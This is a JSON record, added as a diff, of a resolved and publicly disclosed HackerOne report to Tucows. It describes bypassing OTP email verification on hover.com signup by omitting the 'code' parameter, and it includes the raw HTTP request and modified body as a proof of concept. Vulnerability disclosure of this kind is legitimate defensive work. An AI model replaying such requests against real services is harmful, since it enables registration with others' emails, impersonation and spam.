@@ -1,0 +1,127 @@
+{
+  "id": 3255473,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjU1NDcz",
+  "url": "https://hackerone.com/reports/3255473",
+  "title": "Business Logic Error – Bypass of OTP Verification During Signup on hover.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2025-07-16T08:50:18.173Z",
+  "submitted_at": "2025-07-16T08:50:18.288Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "c0rvuz",
+    "url": "/c0rvuz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4fdprn2e2ywc5cwxuqcpbz9ll1ec/db3ccc5a012de75c5cb817bc4e2a41ce2dc72af5298d29011cc3a22da1939441"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 99765,
+    "url": "https://hackerone.com/tucows_vdp",
+    "handle": "tucows_vdp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mkepvaoi246x9gzrqwg0kagw6pqb/3c1a98c0f7063b87f1b854d7726055dea11380ea4e3e58dafddd3ea40bca0679",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/mkepvaoi246x9gzrqwg0kagw6pqb/df848bf230fe1cd5dd26f571b8f1d0ea918f57c041901f0ae53ebe6f36c62f0a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Tucows (VDP)",
+      "twitter_handle": "",
+      "website": "http://tucows.com",
+      "about": "We do a lot, but at our core, we’re in the business of keeping people connected and keeping the Internet open. "
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-09-02T18:24:16.420Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-08-30T09:50:25.521Z",
+  "team_member_agreed_on_going_public_at": "2025-09-02T18:24:16.245Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "An attacker can register an account on www.hover.com using any email address without passing the required OTP verification. By omitting the code parameter entirely from the signup request, the backend completes the registration and returns a valid session. This constitutes a bypass of the OTP verification mechanism and a business logic error with potential for abuse, impersonation.\n\n# PoC\nMake a request on this endpoint:\n```\nPOST /signup HTTP/2\nHost: www.hover.com\nCookie: {{cookie}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/██████████ Firefox/140.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://www.hover.com/signup\nUzlc: true\nContent-Type: application/json;charset=UTF-8\nContent-Length: 233\nOrigin: https://www.hover.com\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nPriority: u=0\nTe: trailers\n\n{\n  \"account\": {\n    \"terms_version\": 2,\n    \"first_name\": \"███\",\n    \"last_name\": \"Sec\",\n    \"email\": \"████\",\n    \"username\": \"███\",\n    \"password\": \"███\",\n    \"token\": null,\n    \"code\": \"624187\",\n    \"tosValues\": {\n      \"consent\": true,\n      \"newsletter\": true\n    }\n  }\n}\n```\n\n2.  Bypass it by delete the parameter code:\n```\n{\n  \"account\": {\n    \"terms_version\": 2,\n    \"first_name\": \"████\",\n    \"last_name\": \"Sec\",\n    \"email\": \"███████████\",\n    \"username\": \"████████\",\n    \"password\": \"████\",\n    \"token\": null,\n    \"tosValues\": {\n      \"consent\": true,\n      \"newsletter\": true\n    }\n  }\n}\n```\n\nResponse:\n```\nHTTP/2 200 OK\n{\"success\": true}\n```\n\n3. Check email, the registration succed:\n\n{F4573647}\n\n## Impact\n\nBypasses OTP verification intended to prove email ownership\nAllows anyone to register accounts using emails they don’t own\nCan prevent real users from registering\nMay allow spam/abuse at scale\nCould aid phishing or impersonation if the system sends emails",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4573647,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jzlph4perzpi5mgpt5seb8yxep9z?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSDCNPZOC%2F20250902%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250902T191508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIAzf8gZFopErAgqP2M6wWrEj%2Bss3Vt654uUY167R2TmRAiBKpuqhxm%2BDLCzCTu4MW2v2BOp5Lpmkz9PLmolapiUMzSqyBQgzEAMaDDAxMzYxOTI3NDg0OSIMolVvMcxNPrGWSR%2FYKo8FHNCGYd49w6ybfyCuTWCzOqLpw8Gb0BEs0dQEJv9YQVzqLFXsNmcpOMH7tScj5cDhrlPgDXcutM7zSrLwnXnVrbY0BkGTtLTVq28iIXPqylQHYnS%2BqxU0VhQxTp%2FiTNb6dCWKRLReODJtXjkVHgn6gaWJgbtEFc77191fWWQ42rBBd0njPsditaMgUQYJKXxOarByIc%2FSz0hv7IeWJNTPswU847vQAdu1MVcZaN2f3ASHFQrN2mEhpa7GWmwV%2Fs39dJaIQcSYDGWg8AdYiab%2FqDES0snY4BDmhmVsYDBJjRiQlgIv0bDW%2BLBEKtt%2FmAY53U2stk1aNrbITbSuulkze9Evfubmdo%2BZ%2BO4ARK0qsIFh3O3isnEFmv8R9bS22SLcQwHoQrw%2FHJMi7z4%2FMTTZkCooMLrQ7GGvYOer5R8nykwSDEfdEHjwf3EKIDHk3ANhb6YxoJDJz3%2BSFh2pU98hMyYf0%2BghPSYPcQ9hbraDw5rw9Am00ZKY3a5aRAKPJt1rGjOGXsUkcEg9RGclpS1f0AP2F%2BGC8w%2F0wTtfyB9dGwlUVr46Zt28AJMg0YdW4ENyCY4zjoyhM%2BLVOQtPokFqkcMkHLqe019KUGq7ZSbT8wMYz2n9BxRaFbeD0WQxBfhY0pqY4etBYyDpf8N7T8jM3PMbOWzwei3cuOcnbOjXxfR1M6XFHfqGHHKcD6o3B58o%2B5xJ7UATEJYXl66TQI9dnCjn1KfFEO7PrZTzhZzTgDQLir%2F1qMlxTvz1GjeV30IRabw4XqtoQKTTxI4MCrgjMq5ep2L%2F0dPWbum1hnNOZBMz1VhBM84nP2%2Fklnb9cKqaSQpJ6pVVqR%2BwQ6sbXYmMXTlM%2F0y60yCYVtNqr42lzDDI4NzFBjqyAcUe7UTeBF6uUGZoLFJ7jd%2F%2B%2BP6oA5gvmAaryLuR%2Fz%2BLH7ZkmQooD0PVpflaXvQSpgXL%2BxSZnRZmiF%2BUTqyW%2Bmx26%2FOxhnClUAd9IbWfAN%2BodPfxPLwgrwyCwOvFwsVwOjJLTNta9Cm2rhIYFMdtW35uxn%2FfuYBIhqnG9OzzSMgcCKjB6T15Y7QTHzGGQUYfUomTtD2u2BJ3qJZvAfKQLhCwO34J%2FzZKkCaYIDyct9u3mAg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c579d6ae624bb3523e5a6fe409a095acb150e0abcbd085eb94faabdec6846537",
+      "file_size": 163611,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "c0rvuz",
+    "blackd3v",
+    "rayansec7",
+    "mistakee"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
